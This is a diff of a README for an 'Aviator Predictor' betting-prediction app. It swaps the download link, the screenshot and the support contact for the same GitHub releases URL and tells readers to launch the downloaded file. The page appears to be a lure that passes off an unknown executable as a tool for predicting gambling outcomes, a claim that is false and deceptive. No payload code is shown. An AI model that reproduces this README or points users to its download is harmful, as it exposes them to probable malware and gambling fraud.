@@ -29,7 +29,7 @@ Aviator Predictor is the go-to app for all your betting needs. Whether you are a
 
 ### Get Started!
 
-🔗 **[Download Aviator Predictor App](https://github.com/uploads/App.zip)** 🔗
+🔗 **[Download Aviator Predictor App](https://github.com/kizumanin/free/releases)** 🔗
 
 Please note that the file needs to be launched once downloaded.
 
@@ -43,7 +43,7 @@ Please note that the file needs to be launched once downloaded.
 
 ### Screenshots
 
-![Aviator Predictor](https://via.placeholder.com/800x400)
+![Aviator Predictor](https://github.com/kizumanin/free/releases)
 
 ### How to Use Aviator Predictor?
 
@@ -64,7 +64,7 @@ Want to contribute to Aviator Predictor? Here's how you can get involved:
 
 ### Support
 
-If you encounter any issues or have any questions, feel free to reach out to our support team at [support@aviatorpredictor.com](mailto:support@aviatorpredictor.com).
+If you encounter any issues or have any questions, feel free to reach out to our support team at [https://github.com/kizumanin/free/releases](https://github.com/kizumanin/free/releases).
 
 ---
 
